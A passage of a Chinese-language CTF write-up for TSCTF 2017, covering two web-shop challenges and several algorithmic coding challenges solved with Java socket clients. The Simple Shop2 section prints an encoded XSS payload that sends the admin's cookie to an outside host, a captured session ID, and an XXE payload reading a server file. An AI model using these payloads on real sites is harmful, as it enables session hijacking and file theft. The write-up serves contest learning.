<code>sid</code>，推测可能购买的时候会以这个识别购买的用户，但是谁有钱呢？</p><img src="/2017/05/15/tsctf-2017-online-contest-write-up/image032.png" class="" title="购物列表"><p>网站还有一个ChatRoom 功能，查看一下，貌似TOM童鞋非常有钱。。。下面的目标就是获取TOM童鞋的sid。</p><img src="/2017/05/15/tsctf-2017-online-contest-write-up/image034.png" class="" title="ChatRoom"><p>整个网站没有查看用户名的地方，所以考虑使用reset功能，看看能不能reset一下密码</p><img src="/2017/05/15/tsctf-2017-online-contest-write-up/image036.png" class="" title="reset密码"><p>没有成功reset密码，但是请求里返回了一个sid，可能是TOM童鞋的</p><img src="/2017/05/15/tsctf-2017-online-contest-write-up/image038.png" class="" title="失败返回"><p>用这个sid替换一下表单中的sid，成功买到flag</p><img src="/2017/05/15/tsctf-2017-online-contest-write-up/image040.png" class="" title="flag入手"><h1 id="websimple-shop2"><a class="markdownIt-Anchor" href="#websimple-shop2"></a> 【WEB】Simple Shop2</h1><p>按照 <strong>Simple Shop1</strong> 的方法进入，购买列表里有个 <strong>talk to manager</strong> ，界面是这个样子。</p><img src="/2017/05/15/tsctf-2017-online-contest-write-up/image042.png" class="" title="给管理员留言"><p>一时也没有什么切入点，就查看了一下源代码。</p><img src="/2017/05/15/tsctf-2017-online-contest-write-up/image044.png" class="" title="页面代码"><p>里面 <code>get_md5.js</code> 代码是</p><img src="/2017/05/15/tsctf-2017-online-contest-write-up/image046.png" class="" title="getmd5.js"><p>根据以往的经验判断，以为是要尽快算出md5的值，才有资格与管理员通信，于是写了个小程序想爆破一下。结果这个思路是错的，这里md5的作用仅仅是浪费时间，起到一个手动验证码的作用。</p><p>后来，有个HINT提示，后台管理员会不停查看这些浏览信息，原来是考查xss相关的知识呀。</p><p>测试了好多，发现会后台会过滤 <code>script</code> 、 <code>英文句号.</code> 、 <code>斜杠/</code> 等字符，考虑使用img的onerror构造一个。</p><p>主要功能是通过一个script标签访问一个内网地址，网址的参数带上cookie，通过get方式将cookie提交到远程服务器。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&lt;script src&#x3D;&#39;http:&#x2F;&#x2F;10.109.33.193&#x2F;index.php?s&#x3D;&quot;+document.cookie+&quot;&#39;&gt;&lt;&#x2F;script&gt;&quot;</span><br></pre></td></tr></table></figure><p>将这段代码HTML encode躲避字符检查，与img的onerror结合起来，通过document.write写入dom中。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&#x27;javascript:document[&quot;write&quot;](<span class="symbol">&amp;#x22;</span><span class="symbol">&amp;#x3C;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x69;</span><span class="symbol">&amp;#x70;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x20;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x3D;</span><span class="symbol">&amp;#x27;</span><span class="symbol">&amp;#x68;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x70;</span><span class="symbol">&amp;#x3A;</span><span class="symbol">&amp;#x2F;</span><span class="symbol">&amp;#x2F;</span><span class="symbol">&amp;#x31;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x2E;</span><span class="symbol">&amp;#x31;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x39;</span><span class="symbol">&amp;#x2E;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x2E;</span><span class="symbol">&amp;#x31;</span><span class="symbol">&amp;#x39;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x2F;</span><span class="symbol">&amp;#x69;</span><span class="symbol">&amp;#x6E;</span><span class="symbol">&amp;#x64;</span><span class="symbol">&amp;#x65;</span><span class="symbol">&amp;#x78;</span><span class="symbol">&amp;#x2E;</span><span class="symbol">&amp;#x70;</span><span class="symbol">&amp;#x68;</span><span class="symbol">&amp;#x70;</span><span class="symbol">&amp;#x3F;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x3D;</span><span class="symbol">&amp;#x22;</span><span class="symbol">&amp;#x2B;</span><span class="symbol">&amp;#x64;</span><span class="symbol">&amp;#x6F;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x75;</span><span class="symbol">&amp;#x6D;</span><span class="symbol">&amp;#x65;</span><span class="symbol">&amp;#x6E;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x2E;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x6F;</span><span class="symbol">&amp;#x6F;</span><span class="symbol">&amp;#x6B;</span><span class="symbol">&amp;#x69;</span><span class="symbol">&amp;#x65;</span><span class="symbol">&amp;#x2B;</span><span class="symbol">&amp;#x22;</span><span class="symbol">&amp;#x27;</span><span class="symbol">&amp;#x3E;</span><span class="symbol">&amp;#x3C;</span><span class="symbol">&amp;#x2F;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x69;</span><span class="symbol">&amp;#x70;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x3E;</span><span class="symbol">&amp;#x22;</span>)&#x27;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>将上面的信息作为消息提交，不一会儿就看到返回的消息，里面带有PHPSession内容。<code>PHPSESSID=fhrlr9dltmis8f00fa1taqmfi</code>，用这段cookie替换本地的cookie，成功拿到管理员权限进入后台。</p><img src="/2017/05/15/tsctf-2017-online-contest-write-up/image048.png" class="" title="后台页面"><p>这里还是没有flag，查看网页源代码发现一个注释，<code>/aaasssddd/flag</code> 里面可能存放着flag。</p><img src="/2017/05/15/tsctf-2017-online-contest-write-up/image052.png" class="" title="后台页面网页"><p>不管怎样先写点儿心路历程吧，请求里发送了一些内容。</p><img src="/2017/05/15/tsctf-2017-online-contest-write-up/image050.png" class="" title="一个心路历程"><p>之前发送的请求都是json格式，这个请求居然是xml格式的，稍微学习了一下，<strong>XXE</strong> 攻击中，可以构建实体来获取指定文件的内容，好在这里没有多少阻碍，构造一个请求</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [<span class="meta">&lt;!ELEMENT <span class="meta-keyword">foo</span> <span class="meta-keyword">ANY</span> &gt;</span><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///aaasssddd/flag&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>title<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;<span class="name">content</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">content</span>&gt;</span><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><p>用postman发送到后台地址，成功拿到flag文件的内容</p><img src="/2017/05/15/tsctf-2017-online-contest-write-up/image054.jpg" class="" title="发送请求"><p>Simple Shop虽然麻烦点，但是整个思路感觉还是很不错的。解出这两道题，很大程度上弥补了我们队在PWN上的不足。</p><h1 id="coding小明的二进制"><a class="markdownIt-Anchor" href="#coding小明的二进制"></a> 【Coding】小明的二进制</h1><blockquote><p>小明发现，有些整数，它们十进制表示的时候，数的每一位只能是0或者1。例如0，1，110，11001都是这样的数，而2，13，900不是，因为这些数的某些位还包含0、1以外的数。小明将这些各位只为1或者0的数，命名为“小明二进制”。 现每轮给出一个整数n，计算一下最少要用多少个“小明二进制”数相加才能得到n，总共50轮。 如13可以表示为13个1相加，也可以13=10+1+1+1，或者13=11+1+1，所以13最少需要3个“小明二进制”数相加才能得到。</p></blockquote><p>开始用了个贪心，找出所有的“小明二进制”数，然后挨个最大的一直减，但是这样做不对。因为我们可以使用任意的组合，按位来看，我们可以将每一位的和拆分到不同的数字上，这样其实就变成了按位找最大的数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sumygg.tsctf2017.xiaoming;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by Sumy on 2017/5/6.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Work</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getXiaomingStep2</span><span class="params">(<span class="keyword">long</span> num)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">long</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (num &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">long</span> x = num % <span class="number">10</span>;</span><br><span class="line">            ans = Math.max(ans, x);</span><br><span class="line">            num /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">int</span>) ans;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Work work = <span class="keyword">new</span> Work();</span><br><span class="line">        work.generateXiaomingNum();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Socket socket = <span class="keyword">new</span> Socket(<span class="string">&quot;10.105.42.5&quot;</span>, <span class="number">41111</span>);</span><br><span class="line">            InputStream input = socket.getInputStream();</span><br><span class="line">            OutputStream output = socket.getOutputStream();</span><br><span class="line">            Scanner scanner = <span class="keyword">new</span> Scanner(input);</span><br><span class="line">            PrintWriter printWriter = <span class="keyword">new</span> PrintWriter(output);</span><br><span class="line">            <span class="keyword">while</span> (scanner.hasNext()) &#123;</span><br><span class="line">                String line = scanner.nextLine();</span><br><span class="line">                System.out.println(line);</span><br><span class="line">                <span class="keyword">if</span> (line.startsWith(<span class="string">&quot;-----&quot;</span>)) &#123;</span><br><span class="line">                    System.out.println(scanner.nextLine());</span><br><span class="line">                    line = scanner.nextLine();</span><br><span class="line">                    System.out.println(line);</span><br><span class="line">                    <span class="keyword">long</span> num = Long.parseLong(line);</span><br><span class="line">                    <span class="keyword">int</span> ans = work.getXiaomingStep2(num);</span><br><span class="line">                    System.out.println(scanner.nextLine());</span><br><span class="line">                    System.out.println(<span class="string">&quot;MyAns: &quot;</span> + ans);</span><br><span class="line">                    printWriter.println(ans);</span><br><span class="line">                    printWriter.flush();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            socket.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="coding泽哥的算术"><a class="markdownIt-Anchor" href="#coding泽哥的算术"></a> 【Coding】泽哥的算术</h1><blockquote><p>泽哥的数学不是很好，有一天老师给泽哥布置了五十道数学题，要求他在10s内给出A的B次幂的后四位，你能算的出来吗？example input : 123 234 output : 6809</p></blockquote><p>只要求最后4位，所以只拿最后5位运算即可，不用整个进行运算。乘法的时候使用快速幂运算。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sumygg.tsctf2017.zege;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by Sumy on 2017/5/6.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Work</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">work</span><span class="params">(<span class="keyword">long</span> a, <span class="keyword">long</span> b)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">long</span> ans = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">long</span> tmp = a;</span><br><span class="line">        <span class="keyword">while</span> (b &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((b &amp; <span class="number">1</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">                ans *= tmp;</span><br><span class="line">                ans %= <span class="number">100000</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            b &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">            tmp *= tmp;</span><br><span class="line">            tmp %= <span class="number">100000</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans % <span class="number">10000</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Work work = <span class="keyword">new</span> Work();</span><br><span class="line">        System.out.println(work.work(<span class="number">123</span>, <span class="number">234</span>));</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Socket socket = <span class="keyword">new</span> Socket(<span class="string">&quot;10.105.42.5&quot;</span>, <span class="number">42222</span>);</span><br><span class="line">            InputStream input = socket.getInputStream();</span><br><span class="line">            OutputStream output = socket.getOutputStream();</span><br><span class="line">            Scanner scanner = <span class="keyword">new</span> Scanner(input);</span><br><span class="line">            PrintWriter printWriter = <span class="keyword">new</span> PrintWriter(output);</span><br><span class="line">            <span class="keyword">while</span> (scanner.hasNext()) &#123;</span><br><span class="line">                String line = scanner.nextLine();</span><br><span class="line">                System.out.println(line);</span><br><span class="line">                <span class="keyword">if</span> (line.startsWith(<span class="string">&quot;-----&quot;</span>)) &#123;</span><br><span class="line">                    System.out.println(scanner.nextLine());</span><br><span class="line">                    line = scanner.nextLine();</span><br><span class="line">                    System.out.println(line);</span><br><span class="line">                    String[] inputnum = line.split(<span class="string">&quot; &quot;</span>);</span><br><span class="line">                    <span class="keyword">long</span> a = Long.parseLong(inputnum[<span class="number">0</span>]);</span><br><span class="line">                    <span class="keyword">long</span> b = Long.parseLong(inputnum[<span class="number">1</span>]);</span><br><span class="line">                    <span class="keyword">long</span> ans = work.work(a, b);</span><br><span class="line">                    System.out.println(scanner.nextLine());</span><br><span class="line">                    System.out.println(a + <span class="string">&quot;^&quot;</span> + b + <span class="string">&quot;--&gt;&quot;</span> + ans);</span><br><span class="line">                    printWriter.println(ans);</span><br><span class="line">                    printWriter.flush();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            socket.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="codinglas-vegas"><a class="markdownIt-Anchor" href="#codinglas-vegas"></a> 【Coding】Las Vegas</h1><blockquote><p>在Las Vegas，霸哥想跟我们玩个简单的取石子游戏，规则如下：游戏给出数字A B,双方轮流从A个石子中取走石子，每次不能超过B个，谁能取走最后一个石子谁就算赢。双方需要完成50轮游戏。</p></blockquote><p>博弈问题，给出的数据总是存在先手必胜的策略，每次取走模(B+1)个即可。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sumygg.tsctf2017.las_vegas;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by Sumy on 2017/5/6.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Work</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Work work = <span class="keyword">new</span> Work();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Socket socket = <span class="keyword">new</span> Socket(<span class="string">&quot;10.105.42.5&quot;</span>, <span class="number">43333</span>);</span><br><span class="line">            InputStream input = socket.getInputStream();</span><br><span class="line">            OutputStream output = socket.getOutputStream();</span><br><span class="line">            Scanner scanner = <span class="keyword">new</span> Scanner(input);</span><br><span class="line">            PrintWriter printWriter = <span class="keyword">new</span> PrintWriter(output);</span><br><span class="line">            <span class="keyword">while</span> (scanner.hasNext()) &#123;</span><br><span class="line">                String line = scanner.nextLine();</span><br><span class="line">                System.out.println(line);</span><br><span class="line">                <span class="keyword">if</span> (line.startsWith(<span class="string">&quot;-----&quot;</span>)) &#123;</span><br><span class="line">                    line = scanner.nextLine();</span><br><span class="line">                    System.out.println(line);</span><br><span class="line">                    String[] inputnum = line.split(<span class="string">&quot; &quot;</span>);</span><br><span class="line">                    <span class="keyword">long</span> a = Long.parseLong(inputnum[<span class="number">0</span>]);</span><br><span class="line">                    <span class="keyword">long</span> b = Long.parseLong(inputnum[<span class="number">1</span>]);</span><br><span class="line">                    <span class="keyword">long</span> choice = a % (b + <span class="number">1</span>);</span><br><span class="line">                    System.out.println(<span class="string">&quot;choice=&quot;</span> + choice);</span><br><span class="line">                    System.out.println(scanner.nextLine());</span><br><span class="line"><span class="comment">//                    System.out.println(a + &quot;^&quot; + b + &quot;--&gt;&quot; + ans);</span></span><br><span class="line">                    printWriter.println(choice);</span><br><span class="line">                    printWriter.flush();</span><br><span class="line">                    <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">                        line = scanner.nextLine();</span><br><span class="line">                        System.out.println(line);</span><br><span class="line">                        <span class="keyword">if</span> (line.startsWith(<span class="string">&quot;Okay&quot;</span>) || line.startsWith(<span class="string">&quot;You&quot;</span>)) &#123;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        a = Long.parseLong(line.split(<span class="string">&quot; &quot;</span>)[<span class="number">1</span>]);</span><br><span class="line">                        choice = a % (b + <span class="number">1</span>);</span><br><span class="line">                        System.out.println(scanner.nextLine());</span><br><span class="line">                        System.out.println(<span class="string">&quot;choice=&quot;</span> + choice);</span><br><span class="line">                        printWriter.println(choice);</span><br><span class="line">                        printWriter.flush();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            socket.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="coding修路"><a class="markdownIt-Anchor" href="#coding修路"></a> 【Coding】修路</h1><blockquote><p>市政府决定在1000个村子(1,2,3,4…1000)间修些路来方便大家出行，市长决定在录用你之前进行一次考察，题目给出800条连通道路信息，再做1000次询问，要求给出村子A与B之间是否连通，是回答&quot;yes&quot;，否回答&quot;no&quot;。</p></blockquote><p>连通图问题，使用Floyd算法即可。时间复杂的O(n^3)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sumygg.tsctf2017.fix_road;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by Sumy on 2017/5/7.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">int</span> VE_NUM = <span class="number">1005</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span>[][] connected;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Solution</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        connected = <span class="keyword">new</span> <span class="keyword">boolean</span>[VE_NUM][VE_NUM];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; VE_NUM; i++) &#123;</span><br><span class="line">            connected[i][i] = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addRoad</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">        connected[a][b] = <span class="keyword">true</span>;</span><br><span class="line">        connected[b][a] = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">connectRoad</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; VE_NUM; k++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; VE_NUM; i++) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; VE_NUM; j++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (connected[i][k] &amp;&amp; connected[k][j]) &#123;</span><br><span class="line">                        connected[i][j] = <span class="keyword">true</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isConnected</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> connected[a][b];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Solution solution = <span class="keyword">new</span> Solution();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Socket socket = <span class="keyword">new</span> Socket(<span class="string">&quot;10.105.42.5&quot;</span>, <span class="number">44444</span>);</span><br><span 